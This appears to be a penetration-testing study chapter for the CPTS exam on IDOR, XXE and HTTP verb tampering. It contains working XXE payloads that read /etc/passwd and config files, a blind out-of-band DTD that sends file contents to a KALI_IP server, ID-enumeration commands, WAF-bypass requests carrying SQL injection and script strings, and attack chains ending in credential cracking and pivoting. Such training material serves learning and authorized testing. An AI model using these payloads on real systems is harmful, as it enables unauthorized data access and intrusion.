# 21 — Advanced Web Attacks (IDOR, XXE, HTTP Verb Tampering)

These three vulnerability classes are covered extensively in the CPTS path but barely touched by the OSCP. They appear on the CPTS exam as part of web application attack chains. Each one can provide initial access, data exposure, or privilege escalation within a web application.

---

## IDOR — Insecure Direct Object References

### What IDOR is

An IDOR vulnerability exists when a web application uses user-supplied input to directly access objects (files, database records, pages) without verifying the user is authorized to access them.

**Simple example:**

```
You're logged in as user ID 123. Your profile page URL is:
  http://target.com/profile?id=123

Change the ID:
  http://target.com/profile?id=124

If you can see user 124's profile → IDOR vulnerability.
The application checked that you're logged in but didn't check
that you're allowed to see user 124's data.
```

### Where to find IDORs

```
URLs with numeric IDs:
  /api/users/123
  /invoice?id=456
  /document/download?doc_id=789
  /profile?user=123
  /order/details/1001

POST/PUT request bodies:
  {"user_id": 123, "action": "view"}
  Change to: {"user_id": 124, "action": "view"}

Headers and cookies:
  Cookie: user_id=123
  Change to: user_id=124

File references:
  /files/user_123_report.pdf
  Try: /files/user_124_report.pdf
  
  /documents/invoice_2026001.pdf
  Try: /documents/invoice_2026002.pdf
```

### How to test for IDOR

```bash
# Step 1: Login to the application and note your user's requests
# Use Burp Suite to capture all requests

# Step 2: Identify parameters that reference objects
# Look for: id, uid, user_id, doc_id, order_id, file, ref, etc.

# Step 3: Change the value and observe
# In Burp Repeater, change id=YOUR_ID to id=OTHER_ID
# Did you get the other user's data? → IDOR

# Step 4: Try common ID patterns
# Sequential: 1, 2, 3, 4, 5
# UUID: try other valid UUIDs if you can discover them
# Hashed: if the ID looks like MD5(username), compute other users' hashes

# Automated testing with ffuf
ffuf -u "http://TARGET/api/users/FUZZ" -w /usr/share/seclists/Fuzzing/1-1000.txt -b "session=YOUR_SESSION_COOKIE" -fs DEFAULT_SIZE
```

### IDOR exploitation on the CPTS

```
Common scenarios:
  1. Access another user's profile → find credentials or sensitive info
  2. Access admin functions → /admin/users?role=admin (change to role=user)
  3. Download other users' files → /files/download?id=OTHER_ID
  4. Modify other users' data → PUT /api/users/OTHER_ID with your changes
  5. Delete resources → DELETE /api/resources/OTHER_ID
  6. Escalate privileges → POST /api/users/YOUR_ID {"role":"admin"}
```

### Bypassing IDOR protections

```
Encoded IDs:
  base64(123) = MTIz
  /api/users/MTIz
  Try: base64(124) = MTI0
  /api/users/MTI0

Hashed IDs:
  md5("123") = 202cb962ac59075b964b07152d234b70
  /api/users/202cb962ac59075b964b07152d234b70
  Try: md5("124") = c8ffe9a587b126f152ed3d89a146b445

Different HTTP methods:
  GET /api/users/124 → 403 Forbidden
  POST /api/users/124 → 200 OK (method not checked!)

Different API versions:
  /api/v2/users/124 → 403
  /api/v1/users/124 → 200 (older version lacks authorization check)

Parameter pollution:
  /api/users?id=123&id=124 (some frameworks take the last value)

JSON body vs URL parameter:
  GET /api/users/123 → blocked
  POST /api/users with body {"id": 124} → works
```

---

## XXE — XML External Entity Injection

### What XXE is

XXE exploits XML parsers that process user-supplied XML input. XML has a feature called "external entities" that can load content from external sources — files on the server, URLs, and even internal network services.

**When an application parses XML you send and the parser allows external entities, you can:**
- Read files from the server (/etc/passwd, configuration files)
- Perform Server-Side Request Forgery (SSRF)
- Port scan internal networks
- Sometimes achieve Remote Code Execution

### How XML entities work

```xml
<!-- Normal XML -->
<user>
  <name>admin</name>
  <email>admin@target.com</email>
</user>

<!-- XML with an internal entity (variable) -->
<!DOCTYPE user [
  <!ENTITY myname "admin">
]>
<user>
  <name>&myname;</name>     <!-- resolves to "admin" -->
</user>

<!-- XML with an EXTERNAL entity (reads a file!) -->
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>        <!-- resolves to contents of /etc/passwd -->
</user>
```

**What happens:**
1. You send XML with an external entity definition to the application
2. The XML parser processes the `<!ENTITY xxe SYSTEM "file:///etc/passwd">` declaration
3. It reads `/etc/passwd` and stores its contents as the entity `&xxe;`
4. Wherever `&xxe;` appears in the XML, it's replaced with the file contents
5. The application returns the response containing the file contents

### Where to find XXE

```
Any endpoint that accepts XML input:
  - SOAP web services (always XML)
  - REST APIs with Content-Type: application/xml
  - File upload that accepts XML, SVG, DOCX (DOCX is a ZIP of XML files)
  - Configuration import features
  - RSS/Atom feed parsers
  - SAML authentication (uses XML)
```

### Testing for XXE

**Step 1: Identify XML input**

In Burp Suite, look for requests with:
```
Content-Type: application/xml
Content-Type: text/xml
```

Or request bodies that look like XML.

**Step 2: Try to change Content-Type**

If the API accepts JSON, try sending XML instead:

```
Original:
Content-Type: application/json
{"name": "admin", "email": "admin@test.com"}

Modified:
Content-Type: application/xml
<?xml version="1.0"?>
<user><name>admin</name><email>admin@test.com</email></user>
```

If the application accepts the XML version, test for XXE.

**Step 3: Inject the XXE payload**

```bash
curl -X POST http://TARGET/api/user -H "Content-Type: application/xml" -d '<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name><email>test@test.com</email></user>'
```

If the response contains the contents of `/etc/passwd`, XXE works.

### XXE payloads

```xml
<!-- Read a file -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Read a PHP file (base64 encoded — avoids XML parsing issues) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
<root>&xxe;</root>

<!-- SSRF — access internal services -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://172.16.0.1:8080/">]>
<root>&xxe;</root>

<!-- SSRF — port scan internal network -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://172.16.0.1:22/">]>
<!-- If port 22 is open, response is different (connection timeout vs refused) -->

<!-- Read Windows files -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>
```

### Blind XXE (when the output isn't reflected)

Sometimes the application processes your XML but doesn't show the entity value in the response. You can use Out-of-Band (OOB) techniques:

```xml
<!-- Step 1: Host a DTD file on your Kali server -->
<!-- On Kali — save as evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://KALI_IP:8080/?data=%file;'>">
%oob;
%exfil;

<!-- Step 2: Send the XXE payload pointing to your DTD -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://KALI_IP:8080/evil.dtd">
  %xxe;
]>
<root>test</root>
```

The server reads the file and sends it to your Kali server as a URL parameter. You see it in your HTTP server logs.

---

## HTTP Verb Tampering

### What it is

HTTP verb tampering exploits applications or web servers that only enforce access controls on certain HTTP methods (GET, POST) but not others (PUT, DELETE, PATCH, HEAD, OPTIONS).

**Example:**

```
GET /admin/dashboard    → 403 Forbidden (blocked)
POST /admin/dashboard   → 403 Forbidden (blocked)
HEAD /admin/dashboard   → 200 OK (not blocked!)
PUT /admin/dashboard    → 200 OK (not blocked!)
OPTIONS /admin/dashboard → 200 OK (reveals allowed methods)
```

The developer configured access control for GET and POST but forgot about other HTTP methods. The web server accepts HEAD, PUT, and OPTIONS without restrictions.

### How to test

```bash
# Test with different HTTP methods
curl -X GET http://TARGET/admin/
curl -X POST http://TARGET/admin/
curl -X PUT http://TARGET/admin/
curl -X PATCH http://TARGET/admin/
curl -X DELETE http://TARGET/admin/
curl -X HEAD http://TARGET/admin/ -v
curl -X OPTIONS http://TARGET/admin/ -v
curl -X TRACE http://TARGET/admin/ -v

# Check what methods are allowed
curl -X OPTIONS http://TARGET/admin/ -v
# Look for: Allow: GET, POST, PUT, DELETE, OPTIONS
```

### Verb tampering scenarios

**Bypass authentication/authorization:**

```bash
# Login page blocks GET
curl http://TARGET/admin/ → redirects to login

# Try HEAD (returns headers only, sometimes bypasses auth checks)
curl -X HEAD http://TARGET/admin/ -v
# If you get 200 OK → the page exists and the auth check doesn't apply to HEAD
```

**Bypass input validation:**

```bash
# POST to a form validates input (blocks special characters)
curl -X POST http://TARGET/search -d "query=<script>alert(1)</script>"
# Response: "Invalid input"

# Try PUT or PATCH (might skip validation)
curl -X PUT http://TARGET/search -d "query=<script>alert(1)</script>"
# Response: works — validation only checks POST
```

**Bypass security filters:**

```bash
# Web Application Firewall blocks SQLi on GET and POST
curl "http://TARGET/page?id=1' OR 1=1-- -"
# Blocked by WAF

# Try with a different verb
curl -X PATCH "http://TARGET/page?id=1' OR 1=1-- -"
# Might bypass the WAF if it only inspects GET/POST
```

### On the CPTS exam

```
Where verb tampering appears:
  1. Admin panels that block GET/POST but not other methods
  2. API endpoints with missing authorization on PUT/DELETE
  3. Upload restrictions that only check POST
  4. WAF/filter bypasses using uncommon methods
  
Always test multiple HTTP methods on every restricted endpoint.
```

---

## Chaining These Attacks

On the CPTS, these attacks often chain together:

```
Example chain:
  1. IDOR on /api/users/FUZZ → discover admin user details
  2. Admin profile reveals an XML import endpoint
  3. XXE on the import endpoint → read /etc/shadow
  4. Crack the hash → SSH as admin
  5. Verb tampering to access restricted admin functions
  
Another chain:
  1. ffuf discovers /api/v1/
  2. IDOR on /api/v1/documents/FUZZ → find a configuration document
  3. Config document references an internal XML service
  4. XXE against the internal service → SSRF to internal network
  5. Pivot to the internal host
```
